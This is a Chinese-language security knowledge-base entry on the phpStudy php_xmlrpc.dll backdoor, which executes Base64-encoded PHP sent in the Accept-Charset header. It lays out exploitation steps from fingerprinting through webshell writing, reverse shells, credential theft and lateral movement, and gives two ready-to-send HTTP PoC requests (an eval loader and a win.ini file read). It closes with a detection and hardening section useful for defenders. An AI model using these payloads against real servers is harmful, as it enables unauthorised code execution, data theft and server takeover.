---
id: web-php-rce-phpstudy-xmlrpc-accept-charset-backdoor
title: phpStudy Windows 版 php_xmlrpc.dll 后门：Accept-Charset 传 Base64 PHP 代码即执行
type: scenario
domain: web
path: web/php/rce
technique: phpstudy-xmlrpc-accept-charset-backdoor
aliases:
- phpStudy 后门 RCE
- phpstudy-backdoor-rce
- php_xmlrpc.dll 后门
- Accept-Charset 代码执行
- phpStudy 2016/2018 后门
- Accept-Charset base64 eval
tags:
- php
- phpstudy
- backdoor
- rce
- accept-charset
- base64
- windows
- supply-chain
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V371
  verified_at: '2026-11-09T05:45:09+08:00'
  notes: 已对照原文核对；Accept-Charset 载荷（eval 的 ZXZhbCgk... 与 readfile win.ini 的 cmVhZG...）及 PHP/5.4.45 指纹与图 01/12 一致；原理为公开 phpStudy 2016/2018 php_xmlrpc.dll 后门背景，原文未直接给出受影响版本，仅目标环境指纹，故未设版本；原文未复现更大载荷
---

## 一句话结论

被植入后门的 phpStudy Windows 版在 PHP 扩展 `ext/php_xmlrpc.dll` 中夹带恶意逻辑：向任意 `.php` 页面发送一个 `Accept-Charset` 请求头、值为 Base64 编码的 PHP 代码，PHP 进程加载扩展后会把该头解码并当作 PHP 执行——无需目标应用存在漏洞、无需账号，即可读文件、写 WebShell、执行系统命令并控制服务器。

## 原理

- **载体在扩展层，不在业务代码**：phpStudy 是 Windows 下集成 Apache/Nginx + PHP + MySQL 的一键环境。后门不在站点源码里，而在随 PHP 进程加载的 `php/php-<版本>/ext/php_xmlrpc.dll` 中。只要请求走到该 PHP，扩展初始化/请求处理路径就会经过后门代码，与目标站点用什么 CMS、有没有上传点无关。
- **触发通道是 HTTP 头**：后门读取请求头 `Accept-Charset` 的值，做 Base64 解码，再交给 PHP 执行引擎（`eval` 一类）执行。HTTP 头完全由客户端控制，服务端不做鉴权、不做来源校验；用头而不是 URL/body 携带载荷，还能避开只盯参数与请求体的常规 WAF 规则。
- **载荷是任意 PHP 代码**：解码结果可以是表达式（`eval($_POST[1]);`）、文件读取（`readfile('C:/Windows/win.ini');`）、写文件（`file_put_contents`）或命令执行（`system`/`exec`/`passthru`），因此后门等价于一个常驻的免登录代码执行入口。
- **公开披露背景**：该后门在 2019 年被公开披露，受影响的是 phpStudy 2016（捆绑 PHP 5.2.17）与 phpStudy 2018（捆绑 PHP 5.4.45）Windows 版；后门位于对应版本目录的 `ext/php_xmlrpc.dll`，官方安装包被人为篡改。公开的通用 PoC 常把载荷写成 `eval($_POST[...])` 形式（其 Base64 以 `ZXZhbCgk` 即 `eval($` 开头），以期命中样本中的特征判断；实战中也观察到直接以 `readfile(...)` 等 Base64 PHP 语句成功执行的样本，说明不同样本/版本的判断条件并不完全一致，以实际回显为准。指纹中的 `PHP/5.4.45`、`PHP/5.2.17` 可辅助识别。
- **为什么成立**：后门代码与正常扩展编译在同一个 DLL 里，PHP 启动即加载；请求头由攻击者任意设置，解码后的字符串直接进入 PHP 执行上下文，全程没有业务层鉴权可依赖。PHP 进程权限（服务账户/管理员）决定最终命令执行权限。

## 触发条件

- 目标运行被植入后门的 phpStudy Windows 版（公开披露为 2016/2018，捆绑 PHP 5.2.17/5.4.45），或捆绑了同一被篡改 `php_xmlrpc.dll` 的 PHP 环境。
- Web 服务可达，且存在可被请求的 `.php` 页面（任意一个即可，不要求漏洞）。
- 请求头未被前置代理/WAF 剥离或改写 `Accept-Charset`。
- PHP 进程具备读取/写入/执行所需权限；WebShell 与命令执行的最终权限等于 PHP 进程权限。

## 利用步骤

1. **指纹识别**：访问站点观察 `Server` / `X-Powered-By`，常见 `Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45` 一类指纹提示 phpStudy 2018 环境；也可用支持 `poc-yaml-phpstudy-backdoor-rce` 的扫描器（如 fscan）探测。
2. **构造载荷**：先把 PHP 代码 Base64 编码，例如 `eval($_POST[1]);` → `ZXZhbCgkX1BPU1RbMV0pOw==`；`readfile('C:/Windows/win.ini');` → `cmVhZGZpbGUoJ0M6L1dpbmRvd3Mvd2luLmluaScpOw==`。
3. **发送验证请求**：把 Base64 串放入 `Accept-Charset`，请求任意 PHP 页面；表达式型载荷配合 POST body 传参，文件读取型载荷直接看响应体。
4. **扩大利用**：验证通过后，用 `file_put_contents` 写 WebShell、用 `system`/`exec` 执行命令或反弹 Shell；也可持续用请求头载荷执行单条命令，不落地文件。
5. **后渗透**：读取 `config.inc.php`、数据库配置等文件获取数据库/应用口令，再以内网主机为跳板横向；注意火绒等终端防护对落地工具与内存加载的拦截。

## PoC

表达式型（`eval($_POST[1]);` 的 Base64 放在头里，POST body 传 PHP 代码）：

```http
POST /index.php HTTP/1.1
Host: target:8080
Accept-Charset: ZXZhbCgkX1BPU1RbMV0pOw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

1=phpinfo();
```

文件读取型（`readfile('C:/Windows/win.ini');` 的 Base64）：

```http
GET /index.php HTTP/1.1
Host: target:8080
Accept-Charset: cmVhZGZpbGUoJ0M6L1dpbmRvd3Mvd2luLmluaScpOw==
Connection: close
```

响应体中出现 `win.ini` 的 `[fonts]`、`[extensions]` 等段落即证明任意 PHP 执行。公开 PoC 常用 `eval($_POST[...])` 形态以匹配后门特征；若某个样本对载荷形态有额外判断，换回 `eval` 形式再试。

## 变体与关联

- **载荷变体**：`readfile`/`file_get_contents` 读任意文件；`file_put_contents`/`fopen` 写 WebShell；`system`/`exec`/`passthru`/反引号执行命令；也可只做 `phpinfo()` 证明执行。
- **通道变体**：Base64 内容既可解码后 `eval` 表达式，也可直接是一段完整 PHP 语句；不同后门样本的触发判断不同，公开扫描器以特征前缀识别。
- **同产品其他入口**：phpStudy Linux 面板的本地服务登录 SQL 注入并写计划任务拿 WebShell 属于另一产品线问题，见 [[web-generic-sqli-phpstudy-linux-panel-socket-login-taskmng-webshell]]。
- **关联工具**：fscan 的 `poc-yaml-phpstudy-backdoor-rce` 指纹/探针；蚁剑等一句话管理工具承接 WebShell。
- **边界**：目标不是被篡改的安装包、`php_xmlrpc.dll` 已被替换/删除、或前置代理剥掉 `Accept-Charset` 时，本通道不成立。

## 检测与防御

- **检测**：Web 访问日志中 `Accept-Charset` 头出现长 Base64 串、`ZXZhbCgk`/`cmVhZGZpbGU`/`c3lzdGVt` 等特征前缀，或该头与 POST body/PHP 页面组合异常；同一来源短时间内对任意 PHP 页面发送不同 Base64 头。
- **文件核查**：比对 phpStudy 安装包与 `php/php-5.2.17/ext/php_xmlrpc.dll`、`php/php-5.4.45/ext/php_xmlrpc.dll` 的哈希/签名/修改时间；非官方来源安装包一律视为不可信。
- **修复**：卸载并重装官方干净版本，或删除/替换被篡改的 `php_xmlrpc.dll`；升级到厂商修复后的版本；无法确认干净时重建系统。
- **加固**：Web 层对 `Accept-Charset` 做格式白名单（只允许合法字符集名）；PHP 进程以低权限账户运行；限制服务器出网与命令执行；部署主机层 HIPS/EDR 监控 `php.exe` 派生 `cmd.exe`/`powershell.exe` 的行为。
- **响应**：按入侵处置排查 Webshell、计划任务与新建账号，审计同一时段所有携带异常 `Accept-Charset` 的请求及后续横向流量。
